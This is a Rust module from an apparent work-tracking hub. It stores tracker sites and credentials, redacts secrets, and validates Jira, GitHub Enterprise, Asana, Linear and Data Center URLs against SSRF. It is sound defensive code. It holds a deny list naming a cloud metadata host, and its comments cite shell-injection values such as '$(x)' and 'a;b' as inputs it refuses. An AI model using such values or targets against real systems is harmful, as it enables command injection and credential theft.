//! Trackers (migration 048): the external sites work items come from, their
//! views, and their credentials. See the M3 plan
//! (`docs/superpowers/plans/2026-09-24-work-graph-m3-trackers-and-jira.md`).
//!
//! The rules that matter here:
//!
//! * **A secret never rides a read path.** [`TrackerRow`] says only whether a
//!   credential is set and a `…abcd` hint of it. The one function that reads
//!   `tracker_secrets` is [`Store::resolve_tracker_credential`], and it hands
//!   back a [`TrackerCredential`], which neither serialises nor prints its
//!   secret. Only transport code calls it.
//! * **A credential may be a reference** — `env:NAME` or `file:/path` — so a
//!   Docker hub keeps its token in a secret mount and never in SQLite. The
//!   reference wins over a stored value; the stored value is the fallback
//!   when the reference cannot be read.
//! * **The site is fenced** ([`normalize_site_url`]): `https://<name>.atlassian.net`
//!   only, until Data Center support (roadmap D6). A tracker's URL is where
//!   the hub sends a credential from its own network position, so it is not a
//!   free-form field (SSRF).
//! * **`last_error` is redacted before it is stored**, patterns and the
//!   tracker's own secret alike.

use super::{now_unix, Store};
use crate::events::EventBus as _;
use crate::ipc_error::{codes, IpcError};
use rusqlite::OptionalExtension;
use serde::{Deserialize, Serialize};
use std::fmt;

/// Providers a tracker may be (M6 adds GitHub, Asana, Linear and Jira Data
/// Center, one at a time).
pub const TRACKER_PROVIDERS: &[&str] = &["jira", "github", "asana", "linear", "jira_dc"];

/// `trackers.state`.
pub const TRACKER_STATES: &[&str] = &[
    "ok",
    "auth_failed",
    "rate_limited",
    "unreachable",
    "captcha",
    "unconfigured",
];

/// `tracker_secrets.auth_kind`: `basic` is Jira Cloud's email + API token;
/// `bearer` is a personal access token (Data Center, later).
pub const TRACKER_AUTH_KINDS: &[&str] = &["basic", "bearer"];

/// Longest tracker name.
pub const TRACKER_NAME_MAX_CHARS: usize = 80;

/// Longest stored `last_error`.
const LAST_ERROR_MAX_CHARS: usize = 500;

/// What a provider's probe learned about the site, kept as `trackers.config`.
/// Unknown fields are ignored and every field defaults, so a newer hub's
/// config never breaks an older reader.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct TrackerConfig {
    /// The API user (Jira `accountId`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub account_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub display_name: Option<String>,
    /// The API user's timezone (IANA), which JQL dates are read in (C27).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tz: Option<String>,
    /// Project keys this site owns (`ABC` for `ABC-123`), upper case.
    #[serde(default)]
    pub key_prefixes: Vec<String>,
    /// Projects that have sprints (C28: per project, not per site).
    #[serde(default)]
    pub sprint_projects: Vec<String>,
    /// The sprint custom field's id (`customfield_10020`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sprint_field: Option<String>,
    /// Jira Data Center: the Epic Link custom field's id.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub epic_field: Option<String>,
    // --- M6: what the providers after Jira learn; all default.
    /// The workspace / organisation the tracker reads (Asana workspace gid,
    /// Linear organisation id).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace: Option<String>,
    /// Containers with their own view (Asana projects the user's tasks sit
    /// in), as `(id, name)`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub projects: Vec<(String, String)>,
    /// The tracker's search is available (Asana: a Premium workspace).
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub search: bool,
    /// Asana: the section → status map the probe INFERRED from section
    /// names (lower-case name → todo | in_progress | done). What a person
    /// confirms goes to `TrackerSettings::section_map`, which wins.
    #[serde(default, skip_serializing_if = "std::collections::BTreeMap::is_empty")]
    pub section_map: std::collections::BTreeMap<String, String>,
}

/// What the ADMIN set for a tracker (migration 050, work graph M6), kept
/// apart from [`TrackerConfig`], which every probe replaces. Never a secret.
/// Unknown fields are ignored and every field defaults.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct TrackerSettings {
    /// GitHub: the repositories (`owner/repo`, lower case) whose issues the
    /// views cover. Empty: `assignee:@me` across the site's owner scope.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub repos: Vec<String>,
    /// Asana: section name (lower case) → `todo` | `in_progress` | `done`.
    /// Inferred on the first sync, correctable in Settings.
    #[serde(default, skip_serializing_if = "std::collections::BTreeMap::is_empty")]
    pub section_map: std::collections::BTreeMap<String, String>,
    /// A person confirmed (or edited) `section_map`; inference stops.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub section_map_confirmed: bool,
    /// Jira Data Center: an extra CA (PEM) the site's certificate chains to.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub extra_ca: Option<String>,
    /// Jira Data Center: the admin allows a site that resolves to a
    /// loopback, private or link-local address (refused by default: SSRF).
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub allow_private_network: bool,
    /// GitHub Enterprise Server (work graph M11.4): the instance's host name,
    /// optionally with a port (`ghe.corp.example`, `ghe.corp.example:8443`),
    /// passed to `gh --hostname`. Unset: github.com. Admin-set and fenced by
    /// [`validate_ghes_hostname`]; its host part is always the site URL's.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub hostname: Option<String>,
}

impl TrackerSettings {
    pub fn is_default(&self) -> bool {
        *self == TrackerSettings::default()
    }
}

/// A tracker as every read path sees it. No secret: see the module docs.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TrackerRow {
    pub id: i64,
    pub provider: String,
    pub name: String,
    #[serde(default)]
    pub instance_id: Option<String>,
    pub site_url: String,
    #[serde(default)]
    pub transport: String,
    #[serde(default)]
    pub config: TrackerConfig,
    /// ok | auth_failed | rate_limited | unreachable | captcha | unconfigured
    /// (and whatever a newer hub adds: readers treat an unknown state as
    /// "not ok").
    pub state: String,
    #[serde(default)]
    pub last_sync_at: Option<i64>,
    #[serde(default)]
    pub last_error: Option<String>,
    pub created_at: i64,
    /// A credential (value or reference) is set.
    #[serde(default)]
    pub has_credential: bool,
    /// `…abcd` for a stored value, the reference itself (`env:JIRA_TOKEN`)
    /// for a reference. Never more of the secret than four characters.
    #[serde(default)]
    pub credential_hint: Option<String>,
    /// `basic` | `bearer`.
    #[serde(default)]
    pub auth_kind: Option<String>,
    /// The account the credential belongs to (Jira: the email). Not a secret.
    #[serde(default)]
    pub username: Option<String>,
    /// The org its items belong to (work graph M5); `None` = unassigned.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub org_id: Option<i64>,
    /// What the admin set (M6); absent from an older hub.
    #[serde(default, skip_serializing_if = "TrackerSettings::is_default")]
    pub settings: TrackerSettings,
}

/// One query a sync runs.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TrackerViewRow {
    pub tracker_id: i64,
    pub view_id: String,
    pub label: String,
    pub query: String,
    /// Newest `updated` (unix seconds) this view has seen; the next pass
    /// starts from it, minus an overlap.
    #[serde(default)]
    pub watermark: Option<i64>,
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// An opaque sync token (M6: Asana's events API), for a provider whose
    /// incremental reads are not a time watermark.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sync_mark: Option<String>,
}

fn default_true() -> bool {
    true
}

/// A secret string: no `Serialize`, and `Debug`/`Display` print
/// `[REDACTED]`. Read it with [`Secret::expose`], only where it is sent.
#[derive(Clone, PartialEq, Eq)]
pub struct Secret(String);

impl Secret {
    pub fn new(s: impl Into<String>) -> Self {
        Secret(s.into())
    }
    pub fn expose(&self) -> &str {
        &self.0
    }
}

impl fmt::Debug for Secret {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(crate::logging::REDACTED)
    }
}

impl fmt::Display for Secret {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(crate::logging::REDACTED)
    }
}

/// A resolved credential, for transport code only.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TrackerCredential {
    pub auth_kind: String,
    pub username: Option<String>,
    pub secret: Secret,
}

impl TrackerCredential {
    /// The `Authorization` header value.
    pub fn authorization(&self) -> Secret {
        use base64::Engine as _;
        match self.auth_kind.as_str() {
            "bearer" => Secret(format!("Bearer {}", self.secret.expose())),
            _ => Secret(format!(
                "Basic {}",
                base64::engine::general_purpose::STANDARD.encode(format!(
                    "{}:{}",
                    self.username.as_deref().unwrap_or_default(),
                    self.secret.expose()
                ))
            )),
        }
    }

    /// Every literal form this credential can appear in — the secret and
    /// the whole `Authorization` value — for literal masking.
    pub fn literals(&self) -> Vec<String> {
        let auth = self.authorization();
        let encoded = auth
            .expose()
            .split_once(' ')
            .map(|(_, v)| v.to_string())
            .unwrap_or_default();
        vec![self.secret.expose().to_string(), encoded]
    }
}

/// Normalise and fence a tracker site URL: `https://<name>.atlassian.net`,
/// lower case, no trailing slash. Refused (`E_INVALID`): another scheme or
/// host, userinfo, a port, a path beyond `/`, a query or a fragment.
pub fn normalize_site_url(raw: &str) -> Result<String, IpcError> {
    let invalid = |why: &str| {
        IpcError::new(
            codes::E_INVALID,
            format!(
                "{why}: a tracker site must be https://<name>.atlassian.net \
                 (Jira Cloud; other hosts are not supported yet)"
            ),
        )
    };
    let t = raw.trim();
    let rest = t
        .strip_prefix("https://")
        .or_else(|| {
            t.get(..8)
                .filter(|p| p.eq_ignore_ascii_case("https://"))
                .map(|_| &t[8..])
        })
        .ok_or_else(|| invalid("not an https:// URL"))?;
    if rest.contains(['?', '#']) {
        return Err(invalid("a query or fragment"));
    }
    let (authority, path) = match rest.find('/') {
        Some(i) => rest.split_at(i),
        None => (rest, ""),
    };
    if !path.is_empty() && path != "/" {
        return Err(invalid("a path"));
    }
    if authority.contains('@') {
        return Err(invalid("userinfo"));
    }
    if authority.contains(':') {
        return Err(invalid("a port"));
    }
    let host = authority.to_ascii_lowercase();
    let Some(name) = host.strip_suffix(".atlassian.net") else {
        return Err(invalid("not an atlassian.net site"));
    };
    let label_ok = !name.is_empty()
        && name.len() <= 63
        && !name.starts_with('-')
        && !name.ends_with('-')
        && name
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-');
    if !label_ok {
        return Err(invalid("not a single site name"));
    }
    Ok(format!("https://{host}"))
}

/// An `https://host[/path]` URL split into its lower-case host and its path
/// segments. Refused: another scheme, userinfo, a port, a query, a fragment.
fn split_https(raw: &str) -> Result<(String, Vec<String>), &'static str> {
    let t = raw.trim();
    let rest = t
        .get(..8)
        .filter(|p| p.eq_ignore_ascii_case("https://"))
        .map(|_| &t[8..])
        .ok_or("not an https:// URL")?;
    if rest.contains(['?', '#']) {
        return Err("a query or fragment");
    }
    let (authority, path) = match rest.find('/') {
        Some(i) => rest.split_at(i),
        None => (rest, ""),
    };
    if authority.contains('@') {
        return Err("userinfo");
    }
    if authority.contains(':') {
        return Err("a port");
    }
    if authority.is_empty()
        || authority
            .chars()
            .any(|c| c.is_whitespace() || c.is_control())
    {
        return Err("no host");
    }
    let segs = path
        .split('/')
        .filter(|s| !s.is_empty())
        .map(str::to_string)
        .collect();
    Ok((authority.to_ascii_lowercase(), segs))
}

/// A GitHub account or repository name (never a flag or a qualifier).
fn github_name(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 100
        && !s.starts_with(['.', '-'])
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'-'))
}

/// `https://github.com` (every repository the `gh` login sees) or
/// `https://github.com/<owner>` — a pasted repository or issue URL narrows
/// to its owner. Lower case. A GitHub Enterprise Server site (M11.4) is the
/// same shape on its own host, `https://<ghes host>[/<owner>]`, the host
/// fenced by [`ghes_host_ok`]; its port, if any, lives in
/// `settings.hostname`, never in the site.
fn normalize_github_site(raw: &str) -> Result<String, IpcError> {
    let invalid = |why: &str| {
        IpcError::new(
            codes::E_INVALID,
            format!(
                "{why}: a GitHub tracker is https://github.com[/<owner>], or \
                 https://<enterprise host>[/<owner>]"
            ),
        )
    };
    let (host, segs) = split_https(raw).map_err(invalid)?;
    let base = if host == "github.com" || host == "www.github.com" {
        "https://github.com".to_string()
    } else if ghes_host_ok(&host) {
        format!("https://{host}")
    } else {
        return Err(invalid("not github.com or a GitHub Enterprise host name"));
    };
    match segs.first() {
        None => Ok(base),
        Some(o) if github_name(o) => Ok(format!("{base}/{}", o.to_ascii_lowercase())),
        Some(_) => Err(invalid("not an owner name")),
    }
}

/// A GitHub tracker's site: `(enterprise host, owner)`. The host is `None`
/// for github.com; the owner `None` for a whole-instance tracker. `None`
/// when `site_url` is not a GitHub site.
pub fn github_site(site_url: &str) -> Option<(Option<String>, Option<String>)> {
    let (host, segs) = split_https(site_url).ok()?;
    let host = match host.as_str() {
        "github.com" | "www.github.com" => None,
        h if ghes_host_ok(h) => Some(h.to_string()),
        _ => return None,
    };
    let owner = segs
        .first()
        .filter(|o| github_name(o))
        .map(|o| o.to_ascii_lowercase());
    Some((host, owner))
}

/// Host names an enterprise hostname may never be: github.com itself (a
/// tracker without `hostname` is github.com), and names that mean this
/// machine or a cloud metadata service.
const GHES_REFUSED_HOSTS: &[&str] = &[
    "github.com",
    "www.github.com",
    "api.github.com",
    "metadata.google.internal",
];

/// The host part of a GitHub Enterprise hostname (M11.4): a DNS name of at
/// least two labels, lower case, each label 1-63 of `[a-z0-9-]` not starting
/// or ending with a dash, at most 253 bytes; the last label is not all
/// digits (so no IPv4 literal — loopback, link-local and metadata addresses
/// included — can pass; an IPv6 literal has no allowed shape at all); not
/// `localhost` or under it; not github.com, a name that dresses up as it
/// (`github.com.evil.example`, `x.github.com`), or a metadata service name.
pub fn ghes_host_ok(host: &str) -> bool {
    let labels: Vec<&str> = host.split('.').collect();
    let label_ok = |l: &&str| {
        !l.is_empty()
            && l.len() <= 63
            && !l.starts_with('-')
            && !l.ends_with('-')
            && l.bytes()
                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
    };
    host.len() <= 253
        && labels.len() >= 2
        && labels.iter().all(label_ok)
        && !labels
            .last()
            .is_some_and(|l| l.bytes().all(|b| b.is_ascii_digit()))
        && host != "localhost"
        && !host.ends_with(".localhost")
        && !GHES_REFUSED_HOSTS.contains(&host)
        && !host.starts_with("github.com.")
        && !host.ends_with(".github.com")
        && !host.contains(".github.com.")
}

/// A GitHub Enterprise Server hostname as an admin sets it (work graph
/// M11.4): `<host>[:<port>]`, lower-cased, the host [`ghes_host_ok`] and the
/// port 1-65535. Refused: a scheme, a path, userinfo, whitespace or any
/// other character a host name cannot have (so `a;b`, `$(x)`, a space or a
/// newline never reach the `gh --hostname` argument), an IP literal, and
/// `localhost`.
///
/// Fleet never connects to this host itself: `gh` on the tracker's
/// `via_cli` host does, with that host's own login and resolver, so there is
/// no connect-time address check here to make (unlike Jira Data Center's
/// resolve-then-refuse in `net::https`). The fence is the name, and it is
/// master-only to set.
pub fn validate_ghes_hostname(raw: &str) -> Result<String, IpcError> {
    let invalid = |why: &str| {
        IpcError::new(
            codes::E_INVALID,
            format!(
                "hostname {why}: a GitHub Enterprise hostname is a DNS name, optionally \
                 with :port (ghe.example.com), without a scheme, path, credentials or \
                 IP address"
            ),
        )
    };
    if raw.is_empty() || raw.len() > 259 {
        return Err(invalid("is empty or too long"));
    }
    if !raw
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b':'))
    {
        return Err(invalid("has a character a host name cannot have"));
    }
    let lower = raw.to_ascii_lowercase();
    let (host, port) = match lower.split_once(':') {
        Some((h, p)) => (h, Some(p)),
        None => (lower.as_str(), None),
    };
    if let Some(p) = port {
        let ok = !p.is_empty()
            && p.len() <= 5
            && !p.starts_with('0')
            && p.bytes().all(|b| b.is_ascii_digit())
            && p.parse::<u32>().is_ok_and(|n| (1..=65_535).contains(&n));
        if !ok {
            return Err(invalid("has a port that is not 1-65535"));
        }
    }
    if !ghes_host_ok(host) {
        return Err(invalid("is not an enterprise DNS host name"));
    }
    Ok(lower)
}

/// The host part of a validated [`validate_ghes_hostname`] value.
pub fn ghes_host_part(hostname: &str) -> &str {
    hostname.split(':').next().unwrap_or(hostname)
}

/// `https://app.asana.com`, or `https://app.asana.com/<workspace gid>` —
/// a pasted `/1/<workspace>/…` task URL names its workspace; a `/0/…` one
/// does not.
fn normalize_asana_site(raw: &str) -> Result<String, IpcError> {
    let invalid = |why: &str| {
        IpcError::new(
            codes::E_INVALID,
            format!(
                "{why}: an Asana tracker is https://app.asana.com or \
                 https://app.asana.com/<workspace gid>"
            ),
        )
    };
    let (host, segs) = split_https(raw).map_err(invalid)?;
    if host != "app.asana.com" {
        return Err(invalid("not app.asana.com"));
    }
    let digits =
        |s: &String| !s.is_empty() && s.len() <= 24 && s.bytes().all(|b| b.is_ascii_digit());
    let ws = match segs.as_slice() {
        [] => None,
        [one, ws, ..] if one == "1" && digits(ws) => Some(ws.clone()),
        [zero, ..] if zero == "0" => None,
        [ws] if digits(ws) => Some(ws.clone()),
        _ => return Err(invalid("not an Asana workspace or task URL")),
    };
    Ok(match ws {
        Some(w) => format!("https://app.asana.com/{w}"),
        None => "https://app.asana.com".into(),
    })
}

/// `https://linear.app/<workspace urlKey>`; a pasted issue URL names its
/// workspace. Lower case.
fn normalize_linear_site(raw: &str) -> Result<String, IpcError> {
    let invalid = |why: &str| {
        IpcError::new(
            codes::E_INVALID,
            format!("{why}: a Linear tracker is https://linear.app/<workspace>"),
        )
    };
    let (host, segs) = split_https(raw).map_err(invalid)?;
    if host != "linear.app" {
        return Err(invalid("not linear.app"));
    }
    match segs.first() {
        Some(ws)
            if !ws.is_empty()
                && ws.len() <= 64
                && ws
                    .bytes()
                    .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_') =>
        {
            Ok(format!("https://linear.app/{}", ws.to_ascii_lowercase()))
        }
        _ => Err(invalid("no workspace in the URL")),
    }
}

/// A Jira Data Center site as an admin enters it (or any ticket URL on it):
/// `https://<host>[/<context path>]`, lower-case host, https only, no
/// userinfo, no port (a port would let the site aim at another service on
/// the same machine), no query or fragment; a `/browse/…` tail is dropped.
/// An Atlassian Cloud host is refused (that is the `jira` provider).
pub fn normalize_dc_site(raw: &str) -> Result<String, IpcError> {
    let invalid = |why: &str| {
        IpcError::new(
            codes::E_INVALID,
            format!(
                "{why}: a Jira Data Center site is https://<host>[/<context path>], \
                 without a port or credentials"
            ),
        )
    };
    let (host, segs) = split_https(raw).map_err(invalid)?;
    let host_ok = host.len() <= 253
        && !host.starts_with(['.', '-'])
        && !host.ends_with(['.', '-'])
        && host.contains('.')
        && host
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'.' || b == b'-');
    if !host_ok {
        return Err(invalid("not a host name"));
    }
    if host.ends_with(".atlassian.net") {
        return Err(invalid("an Atlassian Cloud site (use the jira provider)"));
    }
    let ctx: Vec<&String> = segs
        .iter()
        .take_while(|s| !matches!(s.as_str(), "browse" | "rest" | "secure" | "projects"))
        .collect();
    if ctx.len() > 3
        || ctx.iter().any(|s| {
            s.is_empty()
                || s.starts_with('.')
                || !s
                    .bytes()
                    .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
        })
    {
        return Err(invalid("not a context path"));
    }
    let mut out = format!("https://{host}");
    for s in ctx {
        out.push('/');
        out.push_str(s);
    }
    Ok(out)
}

/// Normalise and fence a site URL for `provider` (see each provider's
/// fence). `E_INVALID` for an unknown provider.
pub fn normalize_provider_site(provider: &str, raw: &str) -> Result<String, IpcError> {
    match provider {
        "jira" => normalize_site_url(raw),
        "github" => normalize_github_site(raw),
        "asana" => normalize_asana_site(raw),
        "linear" => normalize_linear_site(raw),
        "jira_dc" => normalize_dc_site(raw),
        other => Err(IpcError::new(
            codes::E_INVALID,
            format!(
                "unknown tracker provider {other:?}; one of {}",
                TRACKER_PROVIDERS.join(", ")
            ),
        )),
    }
}

/// Largest `extra_ca` PEM accepted.
pub const EXTRA_CA_MAX_BYTES: usize = 16 * 1024;

/// Validate and normalise what an admin sets for a `provider` tracker.
pub fn validate_tracker_settings(
    provider: &str,
    mut s: TrackerSettings,
) -> Result<TrackerSettings, IpcError> {
    let bad = |m: String| IpcError::new(codes::E_INVALID, m);
    if !s.repos.is_empty() && provider != "github" {
        return Err(bad("repos is a GitHub setting".into()));
    }
    let mut repos = Vec::new();
    for r in &s.repos {
        let ok = r
            .trim()
            .split_once('/')
            .filter(|(o, n)| github_name(o) && github_name(n))
            .map(|(o, n)| format!("{o}/{n}").to_ascii_lowercase())
            .ok_or_else(|| bad(format!("{r:?} is not owner/repo")))?;
        if !repos.contains(&ok) {
            repos.push(ok);
        }
    }
    s.repos = repos;
    if !s.section_map.is_empty() && provider != "asana" {
        return Err(bad("section_map is an Asana setting".into()));
    }
    let mut map = std::collections::BTreeMap::new();
    for (k, v) in &s.section_map {
        if !matches!(v.as_str(), "todo" | "in_progress" | "done") {
            return Err(bad(format!(
                "section {k:?} maps to {v:?}; use todo, in_progress or done"
            )));
        }
        let k = k.trim().to_lowercase();
        if k.is_empty() || k.chars().count() > 120 || k.chars().any(char::is_control) {
            return Err(bad(
                "a section name must be 1-120 printable characters".into()
            ));
        }
        map.insert(k, v.clone());
    }
    s.section_map = map;
    if (s.extra_ca.is_some() || s.allow_private_network) && provider != "jira_dc" {
        return Err(bad(
            "extra_ca and allow_private_network are Jira Data Center settings".into(),
        ));
    }
    if let Some(h) = &s.hostname {
        if provider != "github" {
            return Err(bad(
                "hostname is a GitHub (Enterprise Server) setting".into()
            ));
        }
        s.hostname = Some(validate_ghes_hostname(h)?);
    }
    if let Some(pem) = &s.extra_ca {
        if pem.len() > EXTRA_CA_MAX_BYTES || !pem.contains("-----BEGIN CERTIFICATE-----") {
            return Err(bad(format!(
                "extra_ca must be PEM certificates, at most {} KiB",
                EXTRA_CA_MAX_BYTES / 1024
            )));
        }
    }
    Ok(s)
}

/// `trackers.transport`: `direct`, `via_host:<alias>` (curl on that host)
/// or `via_cli:<alias>` (a trusted CLI there — `gh`). Normalised.
pub fn validate_tracker_transport(raw: &str) -> Result<String, IpcError> {
    let t = raw.trim();
    if t.is_empty() || t == "direct" {
        return Ok("direct".into());
    }
    for kind in ["via_host:", "via_cli:"] {
        if let Some(alias) = t.strip_prefix(kind) {
            crate::validate::host_alias_syntax(alias)?;
            return Ok(format!("{kind}{alias}"));
        }
    }
    Err(IpcError::new(
        codes::E_INVALID,
        format!("unknown tracker transport {t:?}; one of direct, via_host:<host>, via_cli:<host>"),
    ))
}

/// The host part of [`normalize_site_url`]'s fence, for the transport's
/// connect-time policy: `<name>.atlassian.net`, one label.
pub fn is_allowed_tracker_host(host: &str) -> bool {
    normalize_site_url(&format!("https://{host}")).is_ok()
}

/// Validate a credential reference: `env:NAME` (`[A-Za-z_][A-Za-z0-9_]*`) or
/// `file:/absolute/path` (no `..`, no control characters).
pub fn validate_credential_ref(r: &str) -> Result<(), IpcError> {
    let bad = |why: &str| {
        IpcError::new(
            codes::E_INVALID,
            format!("credential_ref {why}; use env:NAME or file:/absolute/path"),
        )
    };
    if let Some(name) = r.strip_prefix("env:") {
        let mut b = name.bytes();
        let first = b
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == b'_');
        if !first || !b.all(|c| c.is_ascii_alphanumeric() || c == b'_') {
            return Err(bad("has an invalid variable name"));
        }
        return Ok(());
    }
    if let Some(path) = r.strip_prefix("file:") {
        if !path.starts_with('/')
            || path.split('/').any(|c| c == "..")
            || path.chars().any(char::is_control)
        {
            return Err(bad("must name an absolute path without .."));
        }
        return Ok(());
    }
    Err(bad("has an unknown scheme"))
}

/// Read a credential reference. `None` when it cannot be read (unset
/// variable, missing file, empty value); the reason is logged without the
/// value.
fn read_credential_ref(r: &str) -> Option<String> {
    let value = if let Some(name) = r.strip_prefix("env:") {
        std::env::var(name).ok()
    } else if let Some(path) = r.strip_prefix("file:") {
        match std::fs::read_to_string(path) {
            Ok(v) => Some(v),
            Err(e) => {
                tracing::warn!("tracker credential file {path} unreadable: {}", e.kind());
                None
            }
        }
    } else {
        None
    };
    value
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
}

/// `…abcd`: the last four characters of a stored secret, when it is long
/// enough that four characters say nothing useful about it.
fn secret_hint(value: &str) -> Option<String> {
    let n = value.chars().count();
    if n < 12 {
        return Some("…".into());
    }
    let tail: String = value.chars().skip(n - 4).collect();
    Some(format!("…{tail}"))
}

const TRACKER_COLUMNS: &str = "t.id, t.provider, t.name, t.instance_id, t.site_url, t.transport, \
     t.config, t.state, t.last_sync_at, t.last_error, t.created_at, \
     s.auth_kind, s.username, s.value, s.credential_ref, t.org_id, t.settings";

fn map_tracker(r: &rusqlite::Row<'_>) -> rusqlite::Result<TrackerRow> {
    let config: Option<String> = r.get(6)?;
    let value: Option<String> = r.get(13)?;
    let credential_ref: Option<String> = r.get(14)?;
    let hint = match (&credential_ref, &value) {
        (Some(reference), _) => Some(reference.clone()),
        (None, Some(v)) => secret_hint(v),
        (None, None) => None,
    };
    Ok(TrackerRow {
        id: r.get(0)?,
        provider: r.get(1)?,
        name: r.get(2)?,
        instance_id: r.get(3)?,
        site_url: r.get(4)?,
        transport: r.get(5)?,
        config: config
            .and_then(|c| serde_json::from_str(&c).ok())
            .unwrap_or_default(),
        state: r.get(7)?,
        last_sync_at: r.get(8)?,
        last_error: r.get(9)?,
        created_at: r.get(10)?,
        has_credential: value.is_some() || credential_ref.is_some(),
        credential_hint: hint,
        auth_kind: r.get(11)?,
        username: r.get(12)?,
        org_id: r.get(15)?,
        settings: r
            .get::<_, Option<String>>(16)?
            .and_then(|c| serde_json::from_str(&c).ok())
            .unwrap_or_default(),
    })
    // `value` is dropped here: it was read only to compute the hint.
}

fn map_view(r: &rusqlite::Row<'_>) -> rusqlite::Result<TrackerViewRow> {
    Ok(TrackerViewRow {
        tracker_id: r.get(0)?,
        view_id: r.get(1)?,
        label: r.get(2)?,
        query: r.get(3)?,
        watermark: r.get(4)?,
        enabled: r.get::<_, i64>(5)? != 0,
        sync_mark: r.get(6)?,
    })
}

fn validate_name(name: &str) -> Result<String, IpcError> {
    let n = name.trim();
    if n.is_empty() || n.chars().count() > TRACKER_NAME_MAX_CHARS || n.chars().any(char::is_control)
    {
        return Err(IpcError::new(
            codes::E_INVALID,
            format!("tracker name must be 1-{TRACKER_NAME_MAX_CHARS} printable characters"),
        ));
    }
    Ok(n.to_string())
}

impl Store {
    /// Add a tracker. `E_EXISTS` when the provider already has that site.
    pub fn add_tracker(
        &self,
        provider: &str,
        name: &str,
        site_url: &str,
    ) -> Result<TrackerRow, IpcError> {
        if !TRACKER_PROVIDERS.contains(&provider) {
            return Err(IpcError::new(
                codes::E_INVALID,
                format!(
                    "unknown tracker provider {provider:?}; one of {}",
                    TRACKER_PROVIDERS.join(", ")
                ),
            ));
        }
        let site = normalize_provider_site(provider, site_url)?;
        let name = validate_name(name)?;
        let exists: bool = self.conn.query_row(
            "SELECT EXISTS(SELECT 1 FROM trackers WHERE provider = ?1 AND site_url = ?2)",
            rusqlite::params![provider, site],
            |r| r.get(0),
        )?;
        if exists {
            return Err(IpcError::new(
                codes::E_EXISTS,
                format!("a {provider} tracker for {site} already exists"),
            ));
        }
        self.conn.execute(
            "INSERT INTO trackers (provider, name, site_url, created_at) VALUES (?1, ?2, ?3, ?4)",
            rusqlite::params![provider, name, site, now_unix()],
        )?;
        let id = self.conn.last_insert_rowid();
        self.require_tracker(id)
    }

    pub fn get_tracker(&self, id: i64) -> Result<Option<TrackerRow>, IpcError> {
        self.conn
            .query_row(
                &format!(
                    "SELECT {TRACKER_COLUMNS} FROM trackers t \
                     LEFT JOIN tracker_secrets s ON s.tracker_id = t.id WHERE t.id = ?1"
                ),
                rusqlite::params![id],
                map_tracker,
            )
            .optional()
            .map_err(IpcError::from)
    }

    /// [`Store::get_tracker`], `E_NOTFOUND` when there is none.
    pub fn require_tracker(&self, id: i64) -> Result<TrackerRow, IpcError> {
        self.get_tracker(id)?
            .ok_or_else(|| IpcError::new(codes::E_NOTFOUND, format!("tracker {id} not found")))
    }

    pub fn list_trackers(&self) -> Result<Vec<TrackerRow>, IpcError> {
        let mut stmt = self.conn.prepare(&format!(
            "SELECT {TRACKER_COLUMNS} FROM trackers t \
             LEFT JOIN tracker_secrets s ON s.tracker_id = t.id ORDER BY t.id"
        ))?;
        let rows = stmt.query_map([], map_tracker)?;
        Ok(rows.collect::<rusqlite::Result<Vec<_>>>()?)
    }

    /// Set where a tracker's requests leave from. Resets the state to
    /// `unconfigured` until the next test, like a new credential. A tracker
    /// read through a CLI (`via_cli`) never holds a credential in fleet: any
    /// stored one is dropped.
    pub fn set_tracker_transport(&self, id: i64, transport: &str) -> Result<TrackerRow, IpcError> {
        let transport = validate_tracker_transport(transport)?;
        let row = self.require_tracker(id)?;
        if row.transport == transport {
            return Ok(row);
        }
        let tx = self.conn.unchecked_transaction()?;
        tx.execute(
            "UPDATE trackers SET transport = ?1, state = 'unconfigured', last_error = NULL \
             WHERE id = ?2",
            rusqlite::params![transport, id],
        )?;
        if transport.starts_with("via_cli:") {
            tx.execute(
                "DELETE FROM tracker_secrets WHERE tracker_id = ?1",
                rusqlite::params![id],
            )?;
        }
        tx.commit()?;
        self.require_tracker(id)
    }

    /// Rename a tracker.
    pub fn rename_tracker(&self, id: i64, name: &str) -> Result<TrackerRow, IpcError> {
        let name = validate_name(name)?;
        let n = self.conn.execute(
            "UPDATE trackers SET name = ?1 WHERE id = ?2",
            rusqlite::params![name, id],
        )?;
        if n == 0 {
            return Err(IpcError::new(
                codes::E_NOTFOUND,
                format!("tracker {id} not found"),
            ));
        }
        self.require_tracker(id)
    }

